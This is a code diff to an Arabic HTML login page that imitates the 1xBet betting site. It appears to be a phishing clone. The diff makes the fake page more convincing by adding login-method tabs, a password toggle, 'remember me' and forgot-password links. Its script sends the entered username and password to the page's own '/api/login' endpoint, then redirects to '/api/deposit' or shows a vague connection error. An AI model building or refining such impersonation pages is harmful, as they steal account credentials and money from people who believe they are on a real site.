@@ -5,63 +5,120 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>1xBet - تسجيل الدخول</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; width: 95%; max-width: 400px; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; color: #333; }
-        .tabs { display: flex; border-bottom: 2px solid #edf2f7; margin-bottom: 20px; }
-        .tab { flex: 1; text-align: center; padding: 12px; font-size: 14px; color: #718096; cursor: pointer; transition: 0.3s; }
-        .tab.active { color: #3182ce; border-bottom: 2px solid #3182ce; font-weight: bold; }
-        .input-box { margin-bottom: 15px; }
-        input { width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 8px; font-size: 16px; box-sizing: border-box; background: #f8fafc; }
-        input:focus { border-color: #3182ce; outline: none; background: #fff; }
-        .btn-login { width: 100%; padding: 15px; background-color: #85b13a; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        .btn-login:hover { background-color: #76a032; }
-        #error-msg { color: #e53e3e; font-size: 13px; margin-top: 10px; display: none; text-align: center; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-card { background: white; width: 100%; max-width: 450px; border-radius: 0; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; min-height: 100vh; display: flex; flex-direction: column; }
+        @media (min-width: 480px) { .login-card { min-height: auto; border-radius: 8px; } }
+
+        .header { padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #eee; }
+        .back-icon { font-size: 22px; color: #1a73e8; cursor: pointer; transform: scaleX(-1); display: inline-block; }
+        .header-title { font-weight: bold; font-size: 18px; color: #333; }
+
+        .tabs { display: flex; background: #fff; border-bottom: 2px solid #eee; }
+        .tab { flex: 1; text-align: center; padding: 12px 4px; font-size: 11px; color: #888; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; transition: 0.2s; line-height: 1.4; }
+        .tab.active { color: #1a73e8; border-bottom-color: #1a73e8; font-weight: bold; }
+        .tab-icon { display: block; font-size: 18px; margin-bottom: 4px; }
+
+        .form-content { padding: 25px 20px; flex-grow: 1; }
+        .input-group { position: relative; margin-bottom: 20px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 16px 14px; border: 1px solid #ddd; border-radius: 5px; font-size: 15px; background: #fafafa; color: #333; transition: border-color 0.2s; }
+        input[type="text"]:focus, input[type="password"]:focus { border-color: #1a73e8; outline: none; background: #fff; }
+        .eye-icon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #aaa; cursor: pointer; font-size: 18px; user-select: none; }
+
+        .remember-row { display: flex; align-items: center; gap: 8px; margin-bottom: 22px; color: #555; font-size: 14px; }
+        .remember-row input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-color: #1a73e8; }
+
+        .btn-login { width: 100%; padding: 16px; background-color: #82b541; color: white; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
+        .btn-login:hover { background-color: #73a339; }
+        .btn-login:active { background-color: #629030; }
+
+        .forgot-pass { text-align: center; margin-top: 18px; }
+        .forgot-pass a { color: #1a73e8; text-decoration: none; font-size: 14px; }
+        .forgot-pass a:hover { text-decoration: underline; }
+
+        .register-link { text-align: center; padding: 20px; border-top: 1px solid #eee; margin-top: auto; color: #555; font-size: 14px; }
+        .register-link a { color: #1a73e8; text-decoration: none; font-weight: bold; }
+
+        #error-msg { color: #d32f2f; font-size: 13px; margin-top: 12px; text-align: center; display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="login-card">
         <div class="header">
-            <span style="font-size: 20px; font-weight: bold;">تسجيل الدخول</span>
-            <span style="font-size: 24px; color: #3182ce;">➔</span>
+            <span class="back-icon">➔</span>
+            <span class="header-title">تسجيل الدخول</span>
+            <span style="width:24px"></span>
         </div>
+
         <div class="tabs">
-            <div class="tab">عبر البريد</div>
-            <div class="tab active">عن طريق الهاتف</div>
+            <div class="tab"><span class="tab-icon">📧</span>البريد</div>
+            <div class="tab"><span class="tab-icon">💬</span>الرمز</div>
+            <div class="tab active"><span class="tab-icon">📱</span>الهاتف</div>
+            <div class="tab"><span class="tab-icon">👥</span>الشبكات</div>
         </div>
-        <div class="input-box">
-            <input type="text" id="userInput" placeholder="البريد الإلكتروني أو المعرف *">
+
+        <div class="form-content">
+            <div class="input-group">
+                <input type="text" id="user" placeholder="البريد الإلكتروني أو المعرف *">
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass" placeholder="كلمة المرور *">
+                <span class="eye-icon" onclick="togglePass()">👁️</span>
+            </div>
+
+            <div class="remember-row">
+                <input type="checkbox" id="rem">
+                <label for="rem">تذكرني</label>
+            </div>
+
+            <button class="btn-login" onclick="submitData()">تسجيل الدخول</button>
+            <div id="error-msg">فشل الاتصال، يرجى المحاولة مرة أخرى.</div>
+
+            <div class="forgot-pass">
+                <a href="#">نسيت كلمة المرور؟</a>
+            </div>
         </div>
-        <div class="input-box">
-            <input type="password" id="passInput" placeholder="كلمة المرور *">
+
+        <div class="register-link">
+            ليس لديك حساب؟ <a href="#">تسجيل</a>
         </div>
-        <button class="btn-login" id="submitBtn">تسجيل الدخول</button>
-        <div id="error-msg">فشل الاتصال بالسيرفر، يرجى المحاولة لاحقاً.</div>
     </div>
 
     <script>
-        document.getElementById('submitBtn').onclick = async () => {
-            const user = document.getElementById('userInput').value;
-            const pass = document.getElementById('passInput').value;
+        function togglePass() {
+            const p = document.getElementById('pass');
+            p.type = p.type === 'password' ? 'text' : 'password';
+        }
+
+        async function submitData() {
+            const username = document.getElementById('user').value.trim();
+            const password = document.getElementById('pass').value.trim();
             const err = document.getElementById('error-msg');
             err.style.display = 'none';
+
+            if (!username || !password) {
+                err.style.display = 'block';
+                err.innerText = 'يرجى ملء جميع الحقول';
+                return;
+            }
 
             try {
                 const response = await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: user, password: pass })
+                    body: JSON.stringify({ username, password })
                 });
-
                 if (response.ok) {
-                    window.location.href = "/api/deposit";
+                    window.location.href = '/api/deposit';
                 } else {
                     err.style.display = 'block';
+                    err.innerText = 'فشل الاتصال، يرجى المحاولة مرة أخرى.';
                 }
             } catch (e) {
                 err.style.display = 'block';
+                err.innerText = 'فشل الاتصال، يرجى المحاولة مرة أخرى.';
             }
-        };
+        }
     </script>
 </body>
 </html>
